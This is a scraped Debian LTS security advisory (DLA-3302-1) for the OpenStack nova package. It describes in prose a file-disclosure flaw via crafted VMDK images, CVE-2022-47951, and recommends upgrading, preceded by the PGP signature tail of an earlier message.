found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmParsUACgkQEMKTtsN8
TjaURw/9E7PrUVNUz6L7/r+9DHwx0eURSK67HSt1hoy8KjTwV7Fl5Smc1Rituy/A
NXa9SSVDw8BzCGANjc24EHnAL9bJh8V8CANIKufsIycxcfN2iuBIZdy+uMRrhV1h
xSR7i6daX5aquA/qsWRpxbRoeGybhEt0TAacTvqeK3/+rA6jCfTTcblBCfld6TSw
Pak6zTzGjrodo1qFh4dDgAckPpIWQ5lHOhN6L+1tqArDkpl3wkkKao8MDRNQRQKj
JqLL6zD1sEwLsiQb+IUwQnIAoubAY3lUwjPGIR8bCqPqGxMCPb6/snYmmB/zA1/g
wrjv4zfEdHSAZbqPzFQXfTXIidzXQzcupYZ4t0x8Bacu9LjLPeAPPNnLraFLL5qf
t/oLGOis4KXAsLCnAYm1S2mkFAx4W1B/gYw9uzvXrW2fuX+GsyVVjK9fRm2tvRXU
V/qTTSrdvFW9T/DtFfbctaAJBbiOC7j6XpMezc8qRWoTroL6EWJEfRvWyX2bcLV9
QGF6803AzHRDpLSc4o2YhpHZqathoWvylfZDQu+WXFzFhf3cmzn05S4HG1kD45QJ
uCbo2JmtNBUV/Idq3M8KAG1rS6tIPL+oAT9Ej9aoJhDpcHPxEpiTBMjLqgLJ/QIg
OPe+kKNEciXlN0L+skk4AGwjBG6UZ/PxsNFqGz7u8FQ+DyGoelc=
=3y1c
-----END PGP SIGNATURE-----

```

---



=== Content from lists.debian.org_f857f217_20250114_210628.html ===


---

[[Date Prev](msg00041.html)][[Date Next](msg00043.html)]
[[Thread Prev](msg00041.html)][[Thread Next](msg00043.html)]
[[Date Index](maillist.html#00042)]
[[Thread Index](threads.html#00042)]

# [SECURITY] [DLA 3302-1] nova security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3302-1] nova security update
* *From*: Utkarsh Gupta <guptautkarsh2102@gmail.com>
* *Date*: Tue, 31 Jan 2023 03:45:06 +0530
* *Message-id*: <[[🔎]](/msgid-search/CAPP0f97PYSLQD4V%2BunWxM2OZ_i5iUbjx3a52_4eJ0uAVG3JHfw%40mail.gmail.com) [CAPP0f97PYSLQD4V+unWxM2OZ\_i5iUbjx3a52\_4eJ0uAVG3JHfw@mail.gmail.com](msg00042.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

- -----------------------------------------------------------------------
Debian LTS Advisory DLA-3302-1              debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Utkarsh Gupta
January 31, 2023                            <https://wiki.debian.org/LTS>
- -----------------------------------------------------------------------

Package        : nova
Version        : 2:18.1.0-6+deb10u2
CVE ID         : CVE-2022-47951
Debian Bug     : 1029561

An issue was discovered in Nova, an OpenStack project that provides a
way to provision compute instances (aka virtual servers). By supplying
a specially created VMDK flat image that references a specific backing
file path, an authenticated user may convince systems to return a copy
of that file's contents from the server, resulting in unauthorized
access to potentially sensitive data.

For Debian 10 buster, this problem has been fixed in version
2:18.1.0-6+deb10u2.

We recommend that you upgrade your nova packages.

For the detailed security status of nova please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/nova>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEbJ0QSEqa5Mw4X3xxgj6WdgbDS5YFAmPYQTYACgkQgj6WdgbD
S5a5tA//ZlgnXHebVNuaArBOoximIggUv37lnzX8bUnBiVtHvZlr/pGk/gqE5zrS
moayOFIG8CSGk2N+chFvlKVk6xu7qfMcrAGavq3Mty0xdeRXPWaxwZff72Eb2n8d
dufsrR8F3CAuysqIOM1RhkuH1mGE92QszXwrJ6CbQv8mX2vlYnjw/9kx0NPeIGUM
meSSU5z/C5mDh1w5GcrJBT/APz0qZT0hbiFaEEAMkVq3uwDkn2vgu+pOPe9ceUf9
koSYMLVPNmMre08vdirT/qlrodCQxD67IX2sHOCX33MV1Ad6mkuQpmuOGCzbkHgA
OQoe3y0WPwvKlLNuHGkhmqwAg73mT91PG7M6lU60+HyOyjzLmCV2CB9v2rThb+1A
OUaQdIhzkRTg2uvCrT5SuAiV1gXLaOy/ya3z0j0zlPY58YNIkhhHHdGeo+CkbPqq
JL+qdFe4jqzvZpe0tq3ZkQhidu3oYMNxEFSOgP/OvkP0hL3Aa7yywoGlzsqwXzCF
XEFRDnM271KNrgH7Oicz8uwZEK+InB/KvpVbw+SoE/FBgayK9vRmBlfNzkPYjJB7
jxSux2oCbpdI/b+XzERz1mJUklofeviWOc04FaK5mMAa8f0nhf5wBqMtuMPwrqzA
txzvdQgcdv8lRTVfNQrKbVzdlXzlvPH2skinafHHb6ANOZwbFMs=
=GHQs
-----END PGP SIGNATURE-----

```

---


